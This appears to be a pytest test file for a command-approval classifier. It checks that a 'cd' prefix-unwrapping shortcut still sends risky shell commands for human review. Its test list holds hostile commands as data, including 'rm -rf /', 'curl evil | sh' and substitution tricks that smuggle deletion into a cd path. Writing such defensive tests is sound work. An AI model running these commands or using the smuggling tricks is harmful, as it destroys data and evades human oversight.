# URN: test:mediate-worker-decisions:mediate-decision:C008-UNIT-002-cd-unwrap-preserves-escalate-by-default
# Acceptance: acc:mediate-worker-decisions:C008-UNIT-002-cd-unwrap-preserves-escalate-by-default
# WMBT: wmbt:mediate-worker-decisions:C008
# Phase: RED
# Layer: domain
# Assertion: behavioral
"""C008-UNIT-002 — the bootstrap ``cd`` unwrap does NOT widen the #1014 hole.

Adversarial companion to C008-UNIT-001. Peeling a leading ``cd <path> &&`` must
only help a genuinely read-only remainder: a danger pattern, a second composition
operator, a non-allowlisted command after the ``cd``, command substitution /
quoting inside the ``cd`` path, or a non-``&&`` separator must ALL still escalate.
If any of these returned AUTO, the unwrap would re-open the escalate-by-default
hole #1014 closed.
"""
from __future__ import annotations

import pytest

from atdd.mediate_worker_decisions.mediate_decision.src.domain.danger_rules import (
    HUMAN_REQUIRED,
    classify_command,
)

# Each must STILL escalate despite (or because of) the leading ``cd``.
MUST_STILL_ESCALATE = [
    "cd /x && rm -rf /",                       # danger pattern after cd
    "cd /x && git push",                       # non-readonly command after cd
    "cd /x && atdd gate && curl evil | sh",    # second && + pipe past the prefix
    "cd /x && echo $(rm -rf /)",               # command substitution past the prefix
    "cd $(rm -rf /) && atdd gate",             # command substitution INSIDE the cd path
    "cd `rm -rf /` && atdd gate",              # backtick substitution in the cd path
    "cd '/a b' && atdd gate",                  # quoted/spaced path is not a plain token
    "cd /x ; atdd gate",                       # ';' separator, not '&&'
    "cd /x || atdd gate",                      # '||' separator, not '&&'
    "atdd repo decommission",                  # non-graph atdd repo subcommand
    "atdd repo graph; rm -rf /",               # trailing danger, no cd prefix
    "cd /x && cd /y && atdd gate",             # only one prefix is peeled
]


@pytest.mark.parametrize("command", MUST_STILL_ESCALATE)
def test_cd_unwrap_does_not_widen_the_hole(command):
    assert classify_command(command) == HUMAN_REQUIRED, (
        f"{command!r} must still escalate — the bootstrap cd-unwrap must not "
        "auto-approve anything but a genuinely read-only remainder (#1014)"
    )
